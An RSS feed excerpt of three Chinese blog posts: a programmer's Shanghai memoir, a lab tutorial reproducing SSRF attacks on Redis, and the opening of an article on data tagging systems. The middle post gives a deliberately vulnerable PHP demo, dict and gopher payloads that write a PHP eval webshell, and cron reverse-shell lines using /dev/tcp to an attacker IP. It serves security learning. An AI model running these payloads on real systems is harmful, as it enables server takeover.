&lt;p&gt;15年，跳槽去了一家互联网公司，薪水涨幅不错，就是加班多了些。当然也是个人技术能力成长比较快的一年。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;住所：依旧还是川杨新苑，不过这次不再是群租房，是一个朝南的主卧，从2014年到2015年之间，上海的房价基本翻了一翻，房租也往上直冒，一个简单的朝南主卧标价是1950。当时其实也不会想到去买房，因为根本就是屌丝光棍一个，也未曾想过在上海可以有个房子。那时候同事们大多都在议论买房的事情，而老猫却毫无波澜，因为毕竟也确实买不起，另外连个女朋友都没有，买个蛋。后来才发现，当时应该东拼西凑借钱也得买，那时候还没有限购，另外的2016年上海的房价又是猛涨了一波。&lt;/li&gt;
&lt;li&gt;通勤：由于互联网弹性工作时间，也比较自由，小电驴通勤时间15分钟到公司，一般到公司也是10点半左右了，中饭自费，晚餐包吃，下班比较晚，一般晚上10点多下班，晚一点的话12点左右，那时候觉得这种生活不错，反正回去也没事，所以也接受这样的节奏。&lt;/li&gt;
&lt;li&gt;社交：15年年底一个偶然的机遇，遇到老猫现在的老婆（咳咳，具体认识经过也不赘述，当然劝现在单身的程序员小伙伴也不要着急，因为缘分该来的时候就会来）。&lt;/li&gt;
&lt;li&gt;辛酸：基本没什么辛酸，整年都沉浸在忙忙碌碌的工作中，硬要说辛酸，就是整年加班到很晚。当然15年年底的时候比较幸运地认识了现在的媳妇，有个伴了。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;合伙人创业&quot;&gt;合伙人创业&lt;/h3&gt;
&lt;p&gt;16年，比较重要的事情，就是放弃了互联网公司的期权，被第一家公司的经理拉过去一起和另外的几个销售从0创业做一款基于SAAS平台的CRM系统。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;住所：前半年依旧还是川杨新苑，后来下半年从浦东搬家到了浦西的五号线附近。&lt;/li&gt;
&lt;li&gt;通勤：五号线换一号线到南京西路地铁站，五号线也是比较恶心的一条线路，挤地铁的程度和日本通勤上地铁差不多，基本就是靠着地铁管理员把人当成货物塞进去的，痛苦溢于言表，但是没办法，媳妇在浦西。工作地点是个南京西路的创业孵化中心，在路上的时间其实也还能接受，40分钟左右的路程。&lt;/li&gt;
&lt;li&gt;成长：技术上的成长比较快，前前后后的技术接触了遍，从系统的设计到代码的开发，到前端到运维，最终成功在钉钉开放平台上线了基于SAAS的CRM。&lt;/li&gt;
&lt;li&gt;辛酸：有了媳妇，再多的辛酸都不是辛酸，嘿嘿嘿。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;连续两家单位暴雷&quot;&gt;连续两家单位暴雷&lt;/h3&gt;
&lt;p&gt;17年-18年，这两年比较奇葩的一年，16年我们经历了一年左右的创业，但是最终，因为产品的销售问题，成效不是很好，于是创业这件事情也就黄了。后来又入职了P2P公司，记得15年-18年左右的时候，这种金融公司特别火爆，并且里面的薪水开的也很不错。然而在17年12月份左右，第一家p2p公司暴雷。老板跑去公安局自首了，老猫失业了，但是失业后的第一周就又另外找了家p2p的单位成功入职，但是万万没想到的是到次年的3月份，老板也跑去公安局自首了。记得当时的场景是这样的，一群金侦局的人冲进公司让我们双手离开电脑键盘，手机上缴。我们的经理干脆吓的双手举起，靠到了墙上。老猫记得在基友群里发送的最后一段文字是“完了，警察来了”，之后老猫被关在公司整整一天，到下午5点左右才从公司放出来。基友们炸了，差点没去警局保我，后来拿到手机之后回复了他们，他们才知道情况。这意味着又失业了，而且还有两个月的薪水没有拿到。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;住所：还是在五号线附近。&lt;/li&gt;
&lt;li&gt;通勤：由于两个p2p的公司都在浦东，所以浦西到浦东去上班，整整单次通勤时间为两个小时，可想而知的辛酸，但是为了媳妇，坚持下来了。&lt;/li&gt;
&lt;li&gt;辛酸：连续两次暴雷，对老猫内心造成的伤害超级大，一度认为不适合工作，后来基友也嘲讽说我是“企业杀手”，去哪家哪家倒。&lt;/li&gt;
&lt;li&gt;喜事儿：后来18年的5月份和认识三年的媳妇结婚了，女朋友成为了老婆。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;还算不错&quot;&gt;还算不错&lt;/h3&gt;
&lt;p&gt;18年-20年，这期间又是将近三年的时间，老猫从那次暴雷之后，入职了一家不错的单位，兢兢业业的工作赚钱养家。目前也在这家单位也将近三年时间，此期间负责带领公司的结算技术团队，今年也开始兼顾起公司KA客户的技术支持，日子也还算顺利。当然今年也开通了老猫的个人微信公众号“程序员老猫”，也希望和大家聊聊技术，聊聊除了工作之外的副业。有兴趣的小伙伴可以加个关注。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;住所：从工作到现在一共经历了7次搬家，终于在上海付了首付，买了房。&lt;/li&gt;
&lt;li&gt;喜事儿：今年是特殊的一年，当然一个是疫情，另外一个是在今年的大年初一，老猫成功晋级奶爸，目前父母也在上海在帮助我们照顾小孩儿。&lt;/li&gt;
&lt;li&gt;辛酸：除了房贷，其他也还好，现在每次下班回家都会有个盼头，家里的老婆孩子都在还等着。&lt;/li&gt;
&lt;/ul&gt;&lt;h3 id=&quot;感想&quot;&gt;感想&lt;/h3&gt;
&lt;p&gt;一路走来，磕磕碰碰，困难的时候也咬牙坚持了下来。有了属于自己的一个地儿，有了家庭孩子。至于未来的打算么，就是好好工作，另外的话希望谋求除了本职工作以外的另一个副业，可能也是因为大家都听说“程序员35岁”的梗吧。当然也是在慢慢摸索中，如果再看本篇文章的你也有谋求副业这个打算的话，不妨加老猫的微信：fllufy或者公众号“程序员老猫”给老猫留言，咱们可以一起探讨探讨。&lt;/p&gt;
&lt;p&gt;老猫相信，很多遇到困难的时候，再坚持一下，往往就能有一个好的结果。加油，未来还有很远，老猫一直在路上。&lt;/p&gt;
</description>
<pubDate>Wed, 30 Dec 2020 16:18:00 +0000</pubDate>
<dc:creator>程序员老猫</dc:creator>
<og:description>分享一个普通程序员的六年“沪漂”旅程！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/kdaddy/p/14214095.html</dc:identifier>
</item>
<item>
<title>SSRF之利用dict和gopher吊打Redis - Zh1z3ven</title>
<link>http://www.cnblogs.com/Zh1z3ven/p/14214208.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Zh1z3ven/p/14214208.html</guid>
<description>&lt;h2 id=&quot;写在前面&quot;&gt;写在前面&lt;/h2&gt;
&lt;p&gt;SSRF打Redis也是老生常谈的东西了，这里复现学习一下之前在xz看到某师傅写的关于SSRF利用dict和gopher打内网服务的文章，主要是对webshell和sshkey的写入进行复现，做一点小笔记。&lt;/p&gt;
&lt;h2 id=&quot;准备环境&quot;&gt;准备环境&lt;/h2&gt;
&lt;p&gt;centos：有计划任务服务、redis4.x版本&lt;/p&gt;
&lt;p&gt;kali：作为攻击机，模拟vps&lt;/p&gt;
&lt;p&gt;物理机：phpstudy+ssrf.php&lt;/p&gt;
&lt;h3 id=&quot;redis4x下载&quot;&gt;redis4.x下载&lt;/h3&gt;
&lt;pre&gt;
&lt;code&gt;wget http://download.redis.io/releases/redis-4.0.11.tar.gz
$ tar xzf redis-4.0.11.tar.gz
$ cd redis-4.0.11
$ make

# centos需要提权安装make和gcc依赖包
yum install make 
yum install gcc
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;ssrf漏洞代码&quot;&gt;SSRF漏洞代码&lt;/h3&gt;
&lt;p&gt;网上找了一份demo&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;?php
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_GET['url']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_exec($ch);
curl_close($ch);
?&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;h2 id=&quot;探测漏洞&quot;&gt;探测漏洞&lt;/h2&gt;
&lt;p&gt;首先验证SSRF是否存在，可以通过获取远程服务器上的一些资源（比如图片），看看响应包是否能抓到，如果目标机能出网直接DNSLOG就能拿到真实IP。&lt;/p&gt;
&lt;p&gt;（当然用dict协议也可以）&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GET /ssrf/ssrf.php?url=http://clmppw.dnslog.cn  HTTP/1.1

Host: 192.168.124.1

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

Accept-Language: zh,en-US;q=0.7,en;q=0.3

Accept-Encoding: gzip, deflate

Connection: close

Upgrade-Insecure-Requests: 1
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235414467-118010775.png&quot; alt=&quot;image-20201223173341976&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;dict协议利用&quot;&gt;dict协议利用&lt;/h2&gt;
&lt;h3 id=&quot;dict进行端口探测&quot;&gt;dict进行端口探测&lt;/h3&gt;
&lt;p&gt;抓包将端口那里设为要爆破的参数&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235414093-1882268458.png&quot; alt=&quot;image-20201223173904530&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以事先准备个端口字典，根据Length升序即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235413622-1575389802.png&quot; alt=&quot;image-20201223174301327&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;dict打redis之写webshell&quot;&gt;dict打Redis之写webshell&lt;/h3&gt;
&lt;p&gt;先INFO探测是否设置口令，比如下图提示就是有的&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235413188-1418255141.png&quot; alt=&quot;image-20201223175106039&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;照样可以Inturder模块爆破去，注意用 &lt;code&gt;:&lt;/code&gt; 代替 空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235412895-578498285.png&quot; alt=&quot;image-20201223175332175&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;注意变量后面与 &lt;code&gt;HTTP/1.1&lt;/code&gt; 一定要有空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235412549-1971280823.png&quot; alt=&quot;image-20201223175612826&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;更改rdb文件的目录至网站目录下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;url=dict://192.168.124.153:6380/config:set:dir:/var/www/html
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235412165-85687148.png&quot; alt=&quot;image-20201223180102180&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235411616-1929322818.png&quot; alt=&quot;image-20201223180202048&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;将rdb文件名dbfilename改为webshell的名字&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;url=dict://192.168.124.153:6380/config:set:dbfilename:webshell.php
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235411228-782509580.png&quot; alt=&quot;image-20201223181014473&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235410806-1578853433.png&quot; alt=&quot;image-20201223181051967&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果存在payload被转义或有过滤情况，可利用16进制，写入webshell&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GET /ssrf/ssrf.php?url=dict://192.168.124.153:6380/set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x70\x68\x70\x69\x6e\x66\x6f\x28\x29\x3b\x20\x3f\x3e&quot; 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235410409-884892934.png&quot; alt=&quot;image-20201223182111091&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;清空一下数据， 试试写一句话能不能连上&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GET /ssrf/ssrf.php?url=dict://192.168.124.153:6380/set:webshell:&quot;\x3c\x3f\x70\x68\x70\x20\x65\x76\x61\x6c\x28\x24\x5f\x50\x4f\x53\x54\x5b\x27\x63\x6d\x64\x27\x5d\x29\x3b\x20\x3f\x3e&quot;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235409915-1711432690.png&quot; alt=&quot;image-20201223182344439&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;靶机redis有成功写入，注意最后写save刷新缓存。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235409320-328389569.png&quot; alt=&quot;image-20201223182404919&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;蚁剑连接&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235408615-1669556800.png&quot; alt=&quot;image-20201223204150542&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;dict打redis之计划任务反弹shell&quot;&gt;dict打Redis之计划任务反弹shell&lt;/h3&gt;
&lt;p&gt;因为利用redis去ubuntu写总会有很多玄学问题，这里就用上面准备的centos的redis环境。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;set 1 '\n\n*/1 * * * * root /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/ip/port 0&amp;gt;&amp;amp;1\n\n'

转换一下即：
url=dict://192.168.124.153:6380/set:shell:&quot;\n\n\x2a\x20\x2a\x20\x2a\x20\x2a\x20\x2a\x20root\x20/bin/bash\x20\x2di\x20\x3e\x26\x20/dev/tcp/192.168.124.141/2333\x200\x3e\x261\n\n&quot;
但还要注意这里不能够这么写：\x5c 而应该直接就 \n，也不要写\r\n 因为linux换行符就是\n你写\r反而可能会出现参数污染
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235408280-696471952.png&quot; alt=&quot;image-20201230225238747&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;gopher协议利用&quot;&gt;gopher协议利用&lt;/h2&gt;
&lt;h3 id=&quot;gopher写入webshell&quot;&gt;gopher写入webshell&lt;/h3&gt;
&lt;p&gt;这里利用sec_tools生成gopher协议的payload&lt;/p&gt;
&lt;p&gt;工具：&lt;a href=&quot;https://github.com/firebroo/sec_tools/tree/master/&quot; target=&quot;_blank&quot;&gt;https://github.com/firebroo/sec_tools/tree/master/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用方法：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;redis.cmd&lt;/code&gt;写入攻击所需的redis指令&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235407874-1777982043.png&quot; alt=&quot;image-20201229161117660&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行 &lt;code&gt;redis-over-gopher.py&lt;/code&gt; 得到payload&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235407460-799619690.png&quot; alt=&quot;image-20201229161259613&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;根据目标信息把ip和port换一下即可&lt;/p&gt;
&lt;p&gt;如果这里使用的是&lt;code&gt;curl&lt;/code&gt;命令（比如在命令行curl + gopher）url编码一次即可。也就是用下面的payload就可以&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gopher://192.168.124.153:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%33%0d%0a%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%31%33%0d%0a%73%68%65%6c%6c%5f%73%65%63%2e%70%68%70%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%38%0d%0a%77%65%62%73%68%65%6c%6c%0d%0a%24%31%38%0d%0a%3c%3f%70%68%70%20%70%68%70%69%6e%66%6f%28%29%3b%3f%3e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;如果是web端的参数有ssrf，需要url编码两次才可以打进去，只编码一次时 &lt;code&gt;？&lt;/code&gt; 会作为干扰使得后面payload打不进去。编码时只把特殊符号编码即可，如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gopher://192.168.124.153:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2533%250d%250a%252f%2576%2561%2572%252f%2577%2577%2577%252f%2568%2574%256d%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2531%2533%250d%250a%2573%2568%2565%256c%256c%255f%2573%2565%2563%252e%2570%2568%2570%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2538%250d%250a%2577%2565%2562%2573%2568%2565%256c%256c%250d%250a%2524%2531%2538%250d%250a%253c%253f%2570%2568%2570%2520%2570%2568%2570%2569%256e%2566%256f%2528%2529%253b%253f%253e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;写入成功。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235405954-771975438.png&quot; alt=&quot;image-20201229163050072&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;gopher定时任务反弹shell&quot;&gt;gopher定时任务反弹shell&lt;/h3&gt;
&lt;p&gt;关于定时任务：&lt;/p&gt;
&lt;p&gt;centos： 在/var/spool/cron/root 或 /etc/crontab&lt;/p&gt;
&lt;p&gt;ubuntu: 在/var/spool/cron/crontabs/root 或 /etc/crontab&lt;/p&gt;
&lt;p&gt;Ubuntu这个计划任务吧，利用redis写入总会出现问题，这里使用centos的环境。&lt;/p&gt;
&lt;p&gt;与dict打redis类似先将弹shell语句写入 &lt;code&gt;redis.cmd&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;flushall
config set dir /var/spool/cron
config set dbfilename root
set shell &quot;\n\n*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.124.
141/2333 0&amp;gt;&amp;amp;1\n\n&quot;
save
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;运行&lt;code&gt;redis-over-gopher.py&lt;/code&gt;生成payload，更改payload中的ip和port&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235405408-1815946993.png&quot; alt=&quot;image-20201230212627624&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gopher://192.168.124.128:6380/_%2a%31%0d%0a%24%38%0d%0a%66%6c%75%73%68%61%6c%6c%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%33%0d%0a%64%69%72%0d%0a%24%31%35%0d%0a%2f%76%61%72%2f%73%70%6f%6f%6c%2f%63%72%6f%6e%0d%0a%2a%34%0d%0a%24%36%0d%0a%63%6f%6e%66%69%67%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%31%30%0d%0a%64%62%66%69%6c%65%6e%61%6d%65%0d%0a%24%34%0d%0a%72%6f%6f%74%0d%0a%2a%33%0d%0a%24%33%0d%0a%73%65%74%0d%0a%24%35%0d%0a%73%68%65%6c%6c%0d%0a%24%36%30%0d%0a%5c%6e%5c%6e%2a%2f%31%20%2a%20%2a%20%2a%20%2a%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%32%34%2e%31%34%31%20%30%3e%26%31%5c%6e%5c%6e%0d%0a%2a%31%0d%0a%24%34%0d%0a%73%61%76%65%0d%0a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;同样的，如果不是利用curl的话，直接打需要再次url编码。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;gopher://192.168.124.128:6380/_%252a%2531%250d%250a%2524%2538%250d%250a%2566%256c%2575%2573%2568%2561%256c%256c%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2533%250d%250a%2564%2569%2572%250d%250a%2524%2531%2535%250d%250a%252f%2576%2561%2572%252f%2573%2570%256f%256f%256c%252f%2563%2572%256f%256e%250d%250a%252a%2534%250d%250a%2524%2536%250d%250a%2563%256f%256e%2566%2569%2567%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2531%2530%250d%250a%2564%2562%2566%2569%256c%2565%256e%2561%256d%2565%250d%250a%2524%2534%250d%250a%2572%256f%256f%2574%250d%250a%252a%2533%250d%250a%2524%2533%250d%250a%2573%2565%2574%250d%250a%2524%2535%250d%250a%2573%2568%2565%256c%256c%250d%250a%2524%2536%2530%250d%250a%25%5c%256e%25%5c%256e%252a%252f%2531%2520%252a%2520%252a%2520%252a%2520%252a%2520%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2531%2532%2534%252e%2531%2534%2531%2520%2530%253e%2526%2531%25%5c%256e%25%5c%256e%250d%250a%252a%2531%250d%250a%2524%2534%250d%250a%2573%2561%2576%2565%250d%250a
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1835657/202012/1835657-20201230235404218-1887799963.png&quot; alt=&quot;image-20201230232956269&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;参考文章&quot;&gt;参考文章&lt;/h2&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/8613&quot; target=&quot;_blank&quot;&gt;https://xz.aliyun.com/t/8613&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.cnblogs.com/sijidou/p/13681845.html&quot; target=&quot;_blank&quot;&gt;https://www.cnblogs.com/sijidou/p/13681845.html&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Wed, 30 Dec 2020 15:55:00 +0000</pubDate>
<dc:creator>Zh1z3ven</dc:creator>
<og:description>SSRF之利用dict和gopher吊打Redis 写在前面 SSRF打Redis也是老生常谈的东西了，这里复现学习一下之前在xz看到某师傅写的关于SSRF利用dict和gopher打内网服务的文章，</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/Zh1z3ven/p/14214208.html</dc:identifier>
</item>
<item>
<title>数据应用场景之标签管理体系 - 知了一笑</title>
<link>http://www.cnblogs.com/cicada-smile/p/14214191.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/cicada-smile/p/14214191.html</guid>
<description>&lt;p&gt;标签特点：精确描述定位和搜索，具有生命周期的特性，可以计算，配置和规则化处理。可以用标签来描述各种结构和非结构化[文档、图片、视频等]的数据，从而使这些内容被高效的管理。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;116.36421521808&quot;&gt;

&lt;p&gt;&lt;strong&gt;标签概念&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;标签，最初用来对实物进行分类和标记，例如标明物品的品名、重量、体积、用途等简要信息。后来逐渐流行到数据行业，用来标记数据，对数据快速分类获取和分析。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;标签特点&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;精确描述定位和搜索，具有生命周期的特性，可以计算，配置和规则化处理。可以用标签来描述各种结构和非结构化[文档、图片、视频等]的数据，从而使这些内容被高效的管理。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;描述特征：标签[手机颜色]，特征[红色，白色]；&lt;/li&gt;
&lt;li&gt;描述规则：标签[活跃用户]，规则[每日登陆，产生交易]；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;标签价值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;精细运营的基础，有效提高流量精准和效率。&lt;/li&gt;
&lt;li&gt;帮助产品快速定位需求数据，进行精准分析；&lt;/li&gt;
&lt;li&gt;能帮助客户更快切入到市场周期中；&lt;/li&gt;
&lt;li&gt;深入的预测分析数据并作出及时反应；&lt;/li&gt;
&lt;li&gt;基于标签的开发智能推荐系统；&lt;/li&gt;
&lt;li&gt;基于某类下的数据分析，洞察行业特征；&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;标签的核心价值，或者说最常用的场景：实时智能推荐，精准化数字营销。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1691717/202012/1691717-20201230233841674-2101484585.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;属性标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;属性标签是描述基本特征，不需要行为产生，也不是基于规则引擎分析，例如基于用户实名认证信息，获取：性别，生日，出生日期等特征。变动频率极小，且精准性较高。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;行为标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;通过不同业务渠道埋点，捕捉用户的行为数据，基于这些数据分析，形成结果描述的标签，例如：分析用户「网购平台」，得到的结果拼多多,淘宝,京东,天猫等。这些都是需要通过行为数据来判断的标签。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;规则标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;规则下分析出来的标签，更多是基于产品或者运营角度来看，例如电商平台需要对会员等级超过5级，且近7天活跃的会员发一次福利，这里就涉及两个标签应用：1.「会员等级」基于什么规则判断；2.「近7天活跃」如何判断，是基于登录，还是产生交易行为，这些都要可以动态配置，然后基于规则引擎把结果生成。基于动态的规则配置，经过计算和分析，生成描述的标签，也就是规则标签。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;拟合标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;拟合类标签极具复杂性，通过对多种标签智能组合分析，给出预测描述，或者直接给出进阶定义，例如所谓的读心术，即通过多个特征，眼神信息，判断人的心理活动。在机器学习中有一句话：通过长期对用户行为的判断和学习，机器可能比用户还了解用户。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;层级分类&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;标签管理的基本手段，通常以行业来分：金融，教育，娱乐等；通过多级分类细化管理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;基础标签&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;即数据的关键标签，特点精确扁平，不可再细分，用来精确的描述数据，类似元数据。当使用多个标签组合描述数据特征，就会形成结构化的表管理。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;标签值类型&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;值类型：数字，字典，布尔，日期，文本框，自定义等，是对标签具体值的管理。例如标签「性别」，标签值「男.女.未知」,这种典型通过罗列字典来描述的场景。&lt;/p&gt;

&lt;h2 id=&quot;1、基础流程&quot;&gt;1、基础流程&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1691717/202012/1691717-20201230233829823-302216381.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据采集&lt;/strong&gt;&lt;/p&gt;
